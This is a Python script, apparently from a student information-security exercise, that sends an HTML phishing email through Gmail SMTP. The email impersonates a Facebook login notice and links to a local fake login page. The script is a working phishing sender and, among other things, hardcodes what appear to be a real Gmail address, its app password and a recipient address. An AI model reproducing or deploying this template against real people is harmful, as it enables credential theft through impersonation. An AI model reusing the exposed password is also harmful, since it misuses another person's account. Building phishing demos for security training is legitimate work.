import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# Email server details (for example, Gmail's SMTP)
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "simarasul04@gmail.com"  # Replace with your email address
sender_password = "zqza sdyq ofhi doxb"     # Replace with your email password or app-specific password
receiver_email = "rasulov_sy@auca.kg"  # Replace with the recipient's email




# HTML email content
subject = "Facebook: Login Required"
body = """
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Facebook Email Style</title>
   <style>
       body {
           font-family: Arial, sans-serif;
           margin: 0;
           padding: 0;
           background-color: #fafafa;
       }
       .container {
           max-width: 600px;
           margin: 0 auto;
           background-color: #ffffff;
           padding: 20px;
           border-radius: 10px;
           box-shadow: 0 4px 8px rgba(0,0,0,0.1);
       }
       .header {
           display: flex;
           align-items: center;
           padding-bottom: 20px;
       }
       .header img {
           width: 30px;
 margin-right: 10px;
       }
       .header h2 {
           margin: 0;
           font-size: 24px;
           color: #333;
       }
       .button {
           display: inline-block;
           background-color: #3897f0;
           color: white;
           text-decoration: none;
           padding: 12px 24px;
           border-radius: 5px;
           font-size: 16px;
           text-align: center;
        border: none;
       }
       .footer {
           text-align: center;
           margin-top: 20px;
           font-size: 14px;
           color: #888;
       }
   </style>
</head>
<body>
   <div class="container">
       <div class="header">
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" alt="Facebook Logo">
           <h2>Facebook</h2>
       </div>
       <p style="font-size: 16px; color: #333;">You have a new notification!</p>
       <p style="font-size: 16px; color: #333;">Hello, we've got an update for you. Follow the link below to learn more:</p>
       <p><a href="http://localhost:8000/login" style="color: #3897f0; text-decoration: none;">Click here to view your notification</a></p>
       <div class="footer">
           <p>If you didn’t request this, you can ignore this message.</p>
           <p>Instagram Inc., 1601 Willow Road, Menlo Park, CA 94025</p>
</div>
   </div>
  <script>
       function redirectToPage() {
           window.open('file:///C:/Users/S/PycharmProjects/Information-Security/phishing/templates/Instagram Page_Layout.html', '_blank'); // Opens in a new tab
       }
   </script>
</body>
</html>
"""


# Set up the MIME
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject


# Attach the body with the HTML content
message.attach(MIMEText(body, "html"))


# Send the email
try:
   # Establish a secure session with the server
   server = smtplib.SMTP(smtp_server, smtp_port)
   server.starttls()  # Secure the connection
   server.login(sender_email, sender_password)  # Log into the email server
   text = message.as_string()
   server.sendmail(sender_email, receiver_email, text)  # Send the email
   print("Email sent successfully!")
except Exception as e:
   print(f"Error sending email: {e}")
finally:
   server.quit()  # Close the connection
